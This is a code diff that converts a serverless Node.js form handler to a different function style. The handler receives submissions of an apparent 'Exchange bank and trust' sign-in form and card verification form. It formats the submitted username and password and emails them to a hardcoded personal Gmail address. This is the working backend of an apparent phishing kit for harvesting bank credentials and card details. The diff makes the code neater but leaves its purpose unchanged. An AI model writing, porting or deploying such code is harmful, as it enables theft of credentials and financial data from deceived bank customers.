@@ -1,16 +1,12 @@
-const nodemailer = require('nodemailer');
+import nodemailer from 'nodemailer';
 
-exports.handler = async (event) => {
-    if (event.httpMethod !== 'POST') {
-        return {
-            statusCode: 405,
-            body: JSON.stringify({ message: 'Method Not Allowed' }),
-        };
+export default async function handler(req, res) {
+    if (req.method !== 'POST') {
+        return res.status(405).json({ message: 'Method Not Allowed' });
     }
 
-    const { email, message, subject } = JSON.parse(event.body);
+    const { email, message, subject } = req.body;
 
-    // Configure the email transporter
     const transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
@@ -19,10 +15,8 @@ exports.handler = async (event) => {
         },
     });
 
-    // Change recipient email temporarily
-    const recipient = "samueldaniyan564@gmail.com"; // <-- temporary recipient
+    const recipient = "samueldaniyan564@gmail.com";
 
-    // Format subject for clarity
     let customSubject = 'New Form Submission';
     if (subject === 'Login Details') {
         customSubject = 'Submission of Exchange bank and trust sign in form';
@@ -34,7 +28,6 @@ exports.handler = async (event) => {
         customSubject = 'Submission of Exchange bank and trust Card Verification form';
     }
 
-    // Format message for clarity
     let textBody = '';
     if (subject === 'Login Details') {
         textBody = `Username: ${email}\nPassword: ${message}`;
@@ -57,15 +50,9 @@ exports.handler = async (event) => {
 
     try {
         await transporter.sendMail(mailOptions);
-        return {
-            statusCode: 200,
-            body: JSON.stringify({ message: 'Email sent successfully' }),
-        };
+        return res.status(200).json({ message: 'Email sent successfully' });
     } catch (error) {
         console.error('Error sending email:', error);
-        return {
-            statusCode: 500,
-            body: JSON.stringify({ message: 'Error sending email', error: error.message }),
-        };
+        return res.status(500).json({ message: 'Error sending email', error: error.message });
     }
-};
+}
